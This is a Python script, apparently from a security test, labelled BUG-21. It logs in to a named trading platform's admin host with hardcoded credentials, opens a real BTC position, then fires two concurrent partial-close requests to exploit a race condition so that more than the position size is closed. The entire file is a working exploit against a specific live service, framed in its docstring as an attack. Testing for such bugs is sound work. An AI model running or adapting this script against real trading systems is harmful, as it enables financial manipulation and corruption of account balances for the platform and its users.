"""
BUG-21: Partial Close Race Condition — cumulative partial closes exceed original position size
Attack: Open 1 BTC position, then simultaneously fire 2 partial-close requests of 0.8 BTC each.
If both are accepted, the net closed quantity = 1.6 BTC > original 1.0 BTC → inventory goes negative.
"""
import requests, concurrent.futures, json, time

BASE_URL = "https://lpadmin.blackfx.com"
RESULTS = []

def make_session(email, password):
    s = requests.Session()
    s.post(f"{BASE_URL}/api/auth/login", json={"email": email, "password": password})
    t = s.post(f"{BASE_URL}/api/auth/chart-token").json().get("token")
    return s, {"Authorization": f"Bearer {t}", "Content-Type": "application/json"}

s_m, h_m = make_session("mamm@mailinator.com", "12345678")

# Step 1: Get current funds
r = s_m.get(f"{BASE_URL}/v1/oms/real/positions", headers=h_m)
print("Pre-test balance:", r.json().get("funds", {}).get("balance"))

# Step 2: Open a BTC BUY position
order_resp = s_m.post(f"{BASE_URL}/v1/oms/real/orders", headers=h_m, json={
    "symbol": "BTCUSD", "side": "BUY", "quantity": 0.01, "type": "MARKET"
})
print("Open order:", order_resp.status_code, order_resp.text[:300])

time.sleep(2)

# Step 3: Get position ID
pos_r = s_m.get(f"{BASE_URL}/v1/oms/real/positions", headers=h_m).json()
positions = pos_r.get("positions", [])
print("Positions after open:", json.dumps(positions, indent=2)[:500])

if not positions:
    print("ABORT: No position found")
    exit(1)

pos = positions[0]
market_order_id = pos.get("market_order_id") or pos.get("id") or pos.get("order_id")
qty = pos.get("quantity", 0.01)
print(f"Position market_order_id: {market_order_id}, qty: {qty}")

# Step 4: Simultaneously fire TWO partial-close requests each for 80% of position
partial_qty = round(qty * 0.8, 5)
print(f"Firing 2 concurrent partial closes of {partial_qty} each (total would be {partial_qty*2} vs {qty})")

def partial_close(session, headers, mid, pqty, label):
    r = session.post(
        f"{BASE_URL}/v1/oms/real/positions/{mid}/partial-close",
        headers=headers,
        json={"quantity": pqty}
    )
    result = {"label": label, "status": r.status_code, "body": r.text[:500]}
    print(f"[{label}] {r.status_code}: {r.text[:300]}")
    return result

# Create second session (same user, different session token)
s_m2, h_m2 = make_session("mamm@mailinator.com", "12345678")

with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex:
    f1 = ex.submit(partial_close, s_m, h_m, market_order_id, partial_qty, "SESSION_A")
    f2 = ex.submit(partial_close, s_m2, h_m2, market_order_id, partial_qty, "SESSION_B")
    r1 = f1.result()
    r2 = f2.result()

RESULTS.append(r1)
RESULTS.append(r2)

time.sleep(2)

# Step 5: Check final position state
final = s_m.get(f"{BASE_URL}/v1/oms/real/positions", headers=h_m).json()
print("\n=== FINAL STATE ===")
print(json.dumps(final, indent=2)[:800])

both_ok = r1["status"] == 200 and r2["status"] == 200
if both_ok:
    print("\n🚨 BUG-21 CONFIRMED: Both partial closes returned HTTP 200 — potential over-close!")
else:
    print(f"\n✅ BUG-21 NOT CONFIRMED: responses = {r1['status']}, {r2['status']}")

# Cleanup: squareoff any remaining
remaining = final.get("positions", [])
for p in remaining:
    mid2 = p.get("market_order_id") or p.get("id")
    sq = s_m.post(f"{BASE_URL}/v1/oms/real/positions/{mid2}/squareoff", headers=h_m)
    print("Cleanup squareoff:", sq.status_code)

print("\nBUG-21 test complete.")
